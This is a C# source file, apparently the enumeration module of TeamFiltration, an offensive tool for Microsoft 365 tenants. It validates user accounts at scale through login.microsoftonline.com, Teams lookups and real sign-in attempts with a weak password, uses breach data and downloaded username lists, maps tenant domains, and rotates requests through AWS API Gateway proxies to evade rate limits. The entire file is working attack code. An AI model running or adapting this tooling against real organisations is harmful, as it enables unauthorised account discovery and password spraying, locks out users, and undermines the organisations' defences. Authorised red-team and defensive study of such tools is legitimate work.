using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Linq;
using System.Net.Http;
using System.Security.Authentication;
using System.Text.RegularExpressions;
using TeamFiltration.Models.Teams;
using TeamFiltration.Models.MSOL;
using System.Threading.Tasks;
using System.IO;
using TeamFiltration.Handlers;
using TeamFiltration.Models.TeamFiltration;
using TeamFiltration.Helpers;
using System.Threading.Tasks.Dataflow;
using System.Collections.Concurrent;
using Dasync.Collections;
using System.Threading;
using System.Net.Http.Headers;
using ConsoleTables;

namespace TeamFiltration.Modules
{
    public class EnumOptions
    {

        public EnumOptions(string[] args)
        {
            if (args.Contains("--validate-msol"))
                this.ValidateAccsO365 = true;

            if (args.Contains("--validate-teams"))
                this.ValidateAccsTeams = true;

            if (args.Contains("--validate-login"))
                this.ValidateAccsLogin = true;

            if (args.Contains("--enum-mfa"))
                this.EnumMFA = true;

            if (args.Contains("--dehashed"))
                this.Dehashed = true;
        }

        public bool EnumMFA { get; set; }
        public bool ValidateAccsTeams { get; set; }
        public bool ValidateAccsO365 { get; set; }
        public bool ValidateAccsLogin { get; set; }
        public bool Dehashed { get; set; }

    }

    class Enumerate
    {

        public static GlobalArgumentsHandler _globalProperties { get; set; }
        public static DatabaseHandler _databaseHandle { get; set; }
        public static List<string> _teamsObjectIds = new List<string>() { };

        public static async Task<bool> ValidUserWrapperTeams(TeamsHandler teamsHandler, string username, string enumUserUrl)
        {
            try
            {

                //TODO: Should probably make it so that it does not re-enum invalid accounts
                var validUser = await teamsHandler.EnumUser(username, enumUserUrl);


                if (validUser.isValid && !string.IsNullOrEmpty(validUser.objectId))
                {
                    //check list and add
                    if (!_teamsObjectIds.Contains(validUser.objectId))
                    {
                        if (!string.IsNullOrEmpty(validUser.Outofofficenote?.message))
                            _databaseHandle.WriteLog(new Log("ENUM", $"{username} valid (OutOfOffice message found)!", ""));
                        else
                            _databaseHandle.WriteLog(new Log("ENUM", $"{username} valid!", ""));

                        try
                        {
                            _databaseHandle.WriteValidAcc(new ValidAccount()
                            {
                                Username = username,
                                Id = Helpers.Generic.StringToGUID(username).ToString(),
                                objectId = validUser.objectId,
                                DisplayName = (validUser.responseObject != null) ? validUser.responseObject?.displayName : "",
                                OutOfOfficeMessage = (validUser.Outofofficenote != null) ? validUser.Outofofficenote.message : "",
                            }


                            );
                            return true;
                        }
                        catch (Exception ex)
                        {

                            //LiteDB needs to fix their crap
                            return false;
                        }

                    }
                    else
                    {
                        _databaseHandle.WriteLog(new Log("ENUM", $"{username} valid, but duplicate", ""));
                    }
                }
                else if (validUser.isValid && string.IsNullOrEmpty(validUser.objectId))
                {
                    _databaseHandle.WriteLog(new Log("ENUM", $"{username} valid!", ""));

                    try
                    {
                        _databaseHandle.WriteValidAcc(new ValidAccount() { Username = username, Id = Helpers.Generic.StringToGUID(username).ToString(), objectId = validUser.objectId });
                        return true;
                    }
                    catch (Exception)
                    {
                        return false;
                        //LiteDB needs to fix their crap
                    }
                }

                return false;
            }
            catch (Exception ex)
            {
                _databaseHandle.WriteLog(new Log("ENUM", $"Failed to enum {username}, error: {ex}", ""));
                return false;

            }
        }
        public static async Task<bool> CheckO365Method(MSOLHandler msolHandler, string domain, string url)
        {
            var randomUsername = Guid.NewGuid().ToString().Replace("-", "") + domain;

            var getUserRealmResult = await Helpers.Generic.CheckUserRealm(randomUsername, _globalProperties);

            if (getUserRealmResult.ThirdPartyAuth == false && getUserRealmResult.Adfs == false)
                return true;
            return false;
        }
        public static async Task<bool> ValidUserWrapperLogin(MSOLHandler msolHandler, string username, string tempPassword, string fireProxHolder)
        {


            var rescHolder = Helpers.Generic.RandomO365Res();

            var sprayAttempt = new SprayAttempt()
            {
                Username = username,
                Password = tempPassword,
                FireProxURL = fireProxHolder,
                FireProxRegion = fireProxHolder.Split('.')[2].Split('.')[0],
                ResourceClientId = rescHolder.clientId,
                ResourceUri = rescHolder.Uri
            };


            var loginResp = await msolHandler.LoginAttemptFireProx(username, tempPassword, fireProxHolder, rescHolder, true);

            if (!string.IsNullOrWhiteSpace(loginResp.bearerToken?.access_token))
            {
                _databaseHandle.WriteLog(new Log("ENUM", $"{username} => VALID NO MFA!"));
                _databaseHandle.WriteValidAcc(new ValidAccount() { Username = username, Id = Helpers.Generic.StringToGUID(username).ToString() });
                sprayAttempt.ResponseData = JsonConvert.SerializeObject(loginResp.bearerToken);
                sprayAttempt.Valid = true;

            }
            else if (!string.IsNullOrWhiteSpace(loginResp.bearerTokenError?.error_description))
            {
                var respCode = loginResp.bearerTokenError.error_description.Split(":")[0].Trim();
                var message = loginResp.bearerTokenError.error_description.Split(":")[1].Trim();

                //Set a default response
                var errorCodeOut = (msg: $"UNKNOWN {respCode}", valid: false, disqualified: false, accessPolicy: false);

                //Try to parse
                Helpers.Generic.GetErrorCodes().TryGetValue(respCode, out errorCodeOut);

                if (!errorCodeOut.disqualified)
                {
                    if (errorCodeOut.valid)
                    {
                        _databaseHandle.WriteLog(new Log("ENUM", $"{username} => {errorCodeOut.msg}"));
                        _databaseHandle.WriteInvalidAcc(new ValidAccount() { Username = username, Id = Helpers.Generic.StringToGUID(username).ToString(), objectId = "" });
                    }
                    else
                    {
                        _databaseHandle.WriteLog(new Log("ENUM", $"{username} => VALID"));
                        _databaseHandle.WriteValidAcc(new ValidAccount() { Username = username, Id = Helpers.Generic.StringToGUID(username).ToString() });
                    }
                }

                sprayAttempt.ResponseCode = respCode;
                sprayAttempt.Valid = errorCodeOut.valid;
                sprayAttempt.Disqualified = errorCodeOut.disqualified;
                sprayAttempt.ConditionalAccess = errorCodeOut.accessPolicy;




            }

            _databaseHandle.WriteSprayAttempt(sprayAttempt, _globalProperties);


            return false;
        }

        public static async Task ValidUserWrapperO365(MSOLHandler msolHandler, string username, string url)
        {

            var validUser = await msolHandler.ValidateO365Account(username, url, true);
            if (validUser)
            {
                _databaseHandle.WriteLog(new Log("ENUM", $"{username} valid!", ""));

                _databaseHandle.WriteValidAcc(new ValidAccount() { Username = username, Id = Helpers.Generic.StringToGUID(username).ToString() });

            }
            else if (!validUser)
            {
                //User is not valid, let's note that down
                _databaseHandle.WriteInvalidAcc(new ValidAccount() { Username = username, Id = Helpers.Generic.StringToGUID(username).ToString(), objectId = "" });
            }

        }
        public static async Task EnumerateAsync(string[] args)
        {

            _databaseHandle = new DatabaseHandler(args);

            _globalProperties = new Handlers.GlobalArgumentsHandler(args, _databaseHandle);

            var usernameListPath = args.GetValue("--usernames");

            var getTenantInfo = args.Contains("--tenant-info");

            var options = new EnumOptions(args);



            if (options.ValidateAccsLogin == false && options.ValidateAccsO365 == false && options.ValidateAccsTeams == false && options.Dehashed == false && getTenantInfo == false)
            {
                _databaseHandle.WriteLog(new Log("[+]", $"Please select an validation options! (eg --validate-teams) ", ""));
                Environment.Exit(0);
            }

            string domain = "";
            var msolHandler = new MSOLHandler(_globalProperties, "ENUM", _databaseHandle);
            var userListData = new string[] { };

            if (!string.IsNullOrEmpty(usernameListPath))
            {
                var usernameLines = File.ReadAllLines(usernameListPath);
                if (usernameLines.Count() > 0)
                {
                    userListData = usernameLines.Select(x => x.Trim().ToLower()).Distinct().ToArray();
                    if (!userListData.FirstOrDefault().Contains("@"))
                    {
                        _databaseHandle.WriteLog(new Log("[+]", $"The username list provided needs to be in the format username@company.com!", ""));
                        Environment.Exit(0);

                    }
                    domain = userListData.FirstOrDefault().Split("@")[1];
                }
                else
                {
                    _databaseHandle.WriteLog(new Log("[!]", $"Usernames list provided is emtpy!", ""));
                    Environment.Exit(0);
                }
            }
            else if (options.Dehashed && args.Contains("--domain"))
            {

                var dehashedHandler = new DehashedHandler(_globalProperties);

                var dehashedData = await dehashedHandler.FetchDomainEntries(args.GetValue("--domain"));

                foreach (var email in dehashedData.entries.Select(x => x.email).Distinct().Where(a => Helpers.Generic.IsValidEmail(a)))
                {
                    _databaseHandle.WriteLog(new Log("ENUM", $"{email} valid!", ""));
                    _databaseHandle.WriteValidAcc(new ValidAccount() { Username = email, Id = Helpers.Generic.StringToGUID(email).ToString(), objectId = "" });

                }
                //Pull out all the usernames and smack them into the DB

            }
            else if (args.Contains("--domain"))
            {

                domain = args.GetValue("--domain");

                //To avoid SSL errors
                var httpClientHandler = new HttpClientHandler
                {
                    ServerCertificateCustomValidationCallback = (message, xcert, chain, errors) =>
                    {
                        return true;
                    },
                    SslProtocols = SslProtocols.Tls12 | SslProtocols.Tls11 | SslProtocols.Tls
                };


            startSelection:
                using (var httpClient = new HttpClient(httpClientHandler))
                {
                    var gitHubDict = new Dictionary<int, string>() { };

                    gitHubDict.Add(1, "https://raw.githubusercontent.com/Flangvik/statistically-likely-usernames/master/john.smith.txt");
                    gitHubDict.Add(2, "https://raw.githubusercontent.com/Flangvik/statistically-likely-usernames/master/john.txt");
                    gitHubDict.Add(3, "https://raw.githubusercontent.com/Flangvik/statistically-likely-usernames/master/johnjs.txt");
                    gitHubDict.Add(4, "https://raw.githubusercontent.com/Flangvik/statistically-likely-usernames/master/johns.txt");
                    gitHubDict.Add(5, "https://raw.githubusercontent.com/Flangvik/statistically-likely-usernames/master/johnsmith.txt");
                    gitHubDict.Add(6, "https://raw.githubusercontent.com/Flangvik/statistically-likely-usernames/master/jsmith.txt");
                    gitHubDict.Add(7, "https://raw.githubusercontent.com/Flangvik/statistically-likely-usernames/master/smith.txt");
                    gitHubDict.Add(8, "https://raw.githubusercontent.com/Flangvik/statistically-likely-usernames/master/smithj.txt");
                    gitHubDict.Add(9, "https://raw.githubusercontent.com/Flangvik/statistically-likely-usernames/master/john_smith.txt");
                    gitHubDict.Add(10, "https://raw.githubusercontent.com/Flangvik/statistically-likely-usernames/master/j.smith.txt");
                    gitHubDict.Add(11, "https://raw.githubusercontent.com/Flangvik/statistically-likely-usernames/master/smithjj.txt");


                    foreach (var usernameDict in gitHubDict)
                    {
                        Console.WriteLine($"    |=> [{usernameDict.Key}] " + usernameDict.Value.Split(@"/")[6].Replace(".txt", "@" + domain));
                    }
                    Console.WriteLine();
                    Console.Write("[?] Select an email format #> ");
                    int selection = 0;
                    try
                    {
                        selection = Convert.ToInt32(Console.ReadLine());
                    }
                    catch (Exception ex)
                    {

                        Console.WriteLine("[!] Failed to parse input / selection, try again!");
                        Console.WriteLine("");
                        goto startSelection;
                    }

                    var userListReq = await httpClient.PollyGetAsync(gitHubDict.GetValueOrDefault(selection));
                    if (userListReq.IsSuccessStatusCode)
                    {
                        var userListContent = await userListReq.Content.ReadAsStringAsync();
                        userListData = (userListContent).Split("\n").Where(x => !string.IsNullOrEmpty(x)).Select(x => x + $"@{domain}").ToArray();
                    }
                    else
                    {
                        Console.WriteLine("[!] Failed to download statistically-likely-usernames from Github!");
                        Environment.Exit(0);
                    }
                }

            }

            if (getTenantInfo)
            {
                try
                {

                    UserRealmLoginResp getUserRealm = await msolHandler.GetUserRealm("randomuser@" + domain);
                    Console.WriteLine($"[+] Tenant Brand: {getUserRealm.FederationBrandName}");
                    GetOpenIdConfigResp openIdConfig = await msolHandler.GetOpenIdConfig(domain);
                    //  Console.WriteLine($"Tenant Name: {}");
                    Console.WriteLine($"[+] Tenant Id: {openIdConfig.authorization_endpoint.Split("/")[3]}");
                    Console.WriteLine($"[+] Tenant region: {openIdConfig.tenant_region_scope}");
                    Envelope outlookAutoDiscover = await msolHandler.GetOutlookAutodiscover(domain);
                    var tenantDomains = outlookAutoDiscover.Body.GetFederationInformationResponseMessage.Response.Domains;
                    Console.WriteLine($"[+] Enumerating {tenantDomains.Count()} Tenant Domains:");

                    List<UserRealmLoginResp> userRealmLoginRespList = new List<UserRealmLoginResp>();

                    //Setup the progressBar
                    int conversationCount = 0;
                    int totalConversationCount = tenantDomains.Count();
                    using (var progress = new ProgressBar())
                    {
                        foreach (var tenantDomain in outlookAutoDiscover.Body.GetFederationInformationResponseMessage.Response.Domains)
                        {
                            UserRealmLoginResp bufferGetUserRealm = await msolHandler.GetUserRealm("randomuser@" + tenantDomain);
                            userRealmLoginRespList.Add(bufferGetUserRealm);
                            conversationCount++;
                            progress.Report((double)conversationCount / totalConversationCount);

                        }


                    }
                    Console.WriteLine($"[+] Tenant Domains:");
                    ConsoleTable.From<UserRealmLoginRespPretty>(userRealmLoginRespList.Select(x => (UserRealmLoginRespPretty)x)).Configure(o => o.NumberAlignment = Alignment.Right).Write(Format.Alternative);

                }
                catch (Exception ex)
                {

                    Console.WriteLine("[!] Failed to complete tenant enumeration");
                }
            }


            try
            {
                if (options.ValidateAccsO365 || options.ValidateAccsTeams || options.ValidateAccsLogin)
                {


                    IEnumerable<string> currentValidAccounts = _databaseHandle.QueryValidAccount().Where(a => a != null).Select(x => x?.Username?.ToLower()).ToList();
                    IEnumerable<string> currentInvalidAccounts = _databaseHandle.QueryInvalidAccount().Select(x => x.Username.ToLower()).ToList();

                    _databaseHandle.WriteLog(new Log("ENUM", $"Filtering out previusly attempted accounts", ""));

                    userListData = userListData.Except(currentValidAccounts).ToArray();
                    userListData = userListData.Except(currentInvalidAccounts).ToArray();

                    if (userListData.Count() == 0)
                    {
                        _databaseHandle.WriteLog(new Log("ENUM", $"No valid accounts left after filters applied, exiting..", ""));
                        Environment.Exit(0);
                    }
                }

                if (options.ValidateAccsO365)
                {
                    var approcTime = (int)Math.Round(TimeSpan.FromSeconds((double)userListData.Count() / 50).TotalMinutes);

                    _databaseHandle.WriteLog(new Log("ENUM", $"Warning, this method may give some false positive accounts", ""));
                    _databaseHandle.WriteLog(new Log("ENUM", $"Enumerating {userListData.Count()} possible accounts, this will take ~{approcTime} minutes", ""));

                    (Amazon.APIGateway.Model.CreateDeploymentRequest, Models.AWS.FireProxEndpoint, string fireProxUrl) enumUserUrl = _globalProperties.GetFireProxURLObject("https://login.microsoftonline.com", (new Random()).Next(0, _globalProperties.AWSRegions.Length));

                    //Check if this options is possible
                    if (!domain.StartsWith("@"))
                    {
                        domain = "@" + domain;
                    }

                    string url = $"{enumUserUrl.fireProxUrl}common/GetCredentialType";

                    //This method only works for Tenants were AAD is federating, not adfs or any third party auth

                    if ((await CheckO365Method(msolHandler, $"{domain}", url)))
                    {
                        await userListData.ParallelForEachAsync(
                            async user =>
                            {
                                await ValidUserWrapperO365(msolHandler, user, url);

                            }, maxDegreeOfParallelism: 50);




                    }
                    else
                    {
                        _databaseHandle.WriteLog(new Log("ENUM", "O365 validation method unavailable for this tentant, try teams method!"));

                    }


                    await _globalProperties._awsHandler.DeleteFireProxEndpoint(enumUserUrl.Item1.RestApiId, enumUserUrl.Item2.Region);
                }
                else if (options.ValidateAccsTeams)
                {
                    if (Helpers.Generic.IsValidEmail(_globalProperties?.TeamFiltrationConfig?.SacrificialO365Username) && !string.IsNullOrEmpty(_globalProperties?.TeamFiltrationConfig?.SacrificialO365Passwords))
                    {
                        var approcTime = (int)Math.Round(TimeSpan.FromSeconds(((double)userListData.Count() / 300)).TotalMinutes);

                        _databaseHandle.WriteLog(new Log("ENUM", $"Enumerating {userListData.Count()} possible accounts, this will take ~{approcTime} minutes", ""));

                        var teamsToken = await msolHandler.LoginAttemptFireProx(
                            _globalProperties.TeamFiltrationConfig.SacrificialO365Username,
                            _globalProperties.TeamFiltrationConfig.SacrificialO365Passwords,
                            _globalProperties.GetBaseUrl(),

                            ("https://api.spaces.skype.com/", "1fec8e78-bce4-4aaf-ab1b-5451cc387264"));

                        if (teamsToken.bearerToken != null)
                        {

                            _databaseHandle.WriteLog(new Log("ENUM", $"Successfully got Teams token for sacrificial account", ""));

                            TeamsHandler teamsHandler = new TeamsHandler(teamsToken.bearerToken, _globalProperties);

                            //Pull out objectId's
                            var previusValidAccs = _databaseHandle.QueryValidAccount();
                            if (previusValidAccs.Count() > 0)
                            {
                                _teamsObjectIds = previusValidAccs?.Select(x => x?.objectId).ToList();
                            }


                            //We need a skype token to get other stuff
                            var getSkypeToken = await teamsHandler.SetSkypeToken();

                            if (getSkypeToken.Item2 != null)
                            {
                                _databaseHandle.WriteLog(new Log("ENUM", $"Error getting Skype token: {getSkypeToken.Item2.message}", ""));
                                Environment.Exit(0);
                            }
                            _databaseHandle.WriteLog(new Log("ENUM", $"Loaded {userListData.Count()} usernames", ""));


                            (Amazon.APIGateway.Model.CreateDeploymentRequest, Models.AWS.FireProxEndpoint, string fireProxUrl) enumUserUrl = _globalProperties.GetFireProxURLObject("https://teams.microsoft.com/api/mt/", (new Random()).Next(0, _globalProperties.AWSRegions.Length));

                            //Perfom an sanity check to make sure we can validate anything for this tenant at all

                            var sanityCheck = await ValidUserWrapperTeams(teamsHandler, "ThisUserShouldNotExist@" + userListData.FirstOrDefault().Split('@')[1], enumUserUrl.fireProxUrl);
                            if (sanityCheck == true)
                            {
                                _databaseHandle.WriteLog(new Log("ENUM", $"Pre-Enum sanity check failed, cannot enum this tenant!", ""));

                            }
                            else
                            {

                                await userListData.ParallelForEachAsync(
                                   async user =>
                                   {
                                       await ValidUserWrapperTeams(teamsHandler, user, enumUserUrl.fireProxUrl);
                                   },
                                   maxDegreeOfParallelism: 300);
                            }


                            await _globalProperties._awsHandler.DeleteFireProxEndpoint(enumUserUrl.Item1.RestApiId, enumUserUrl.Item2.Region);

                        }
                        else
                        {
                            _databaseHandle.WriteLog(new Log("ENUM", $"Teams enumeration failed, error: {teamsToken.bearerTokenError.error_description}", ""));

                        }
                    }
                    else
                    {
                        _databaseHandle.WriteLog(new Log("ENUM", $"Teams enumeration failed, lack of Sacrificial O365 Username and/or password", ""));

                    }
                }
                else if (options.ValidateAccsLogin)
                {
                    var approxTime = (int)Math.Round(TimeSpan.FromSeconds((userListData.Count() / 100)).TotalMinutes);
                    var tempPw = Helpers.Generic.GenerateWeakPasswords().FirstOrDefault();
                    _databaseHandle.WriteLog(new Log("ENUM", $"Warning, THIS METHOD WILL PRODUCE LOGIN ATTEMPTS AND IF USED FREQUENTLY,MAY LOCKOUT ACCOUNTS!", ""));
                    _databaseHandle.WriteLog(new Log("ENUM", $"Enumerating {userListData.Count()} accounts with password {tempPw}, this will take ~{approxTime} minutes", ""));


                    (Amazon.APIGateway.Model.CreateDeploymentRequest, Models.AWS.FireProxEndpoint, string fireProxUrl) enumUserUrl
                        = _globalProperties.GetFireProxURLObject("https://login.microsoftonline.com", (new Random()).Next(0, _globalProperties.AWSRegions.Length));


                    await userListData.ParallelForEachAsync(
                        async user =>
                        {
                            await ValidUserWrapperLogin(msolHandler, user, tempPw, $"https://{enumUserUrl.Item1.RestApiId}.execute-api.{enumUserUrl.Item2.Region}.amazonaws.com/fireprox/common/oauth2/token");

                        },
                        maxDegreeOfParallelism: 100);



                    await _globalProperties._awsHandler.DeleteFireProxEndpoint(enumUserUrl.Item1.RestApiId, enumUserUrl.Item2.Region);
                }


            }
            catch (Exception ex)
            {

                _databaseHandle.WriteLog(new Log("ENUM", $"SOFT ERROR ENUM  => {ex.Message}", ""));
            }

        }



    }
}
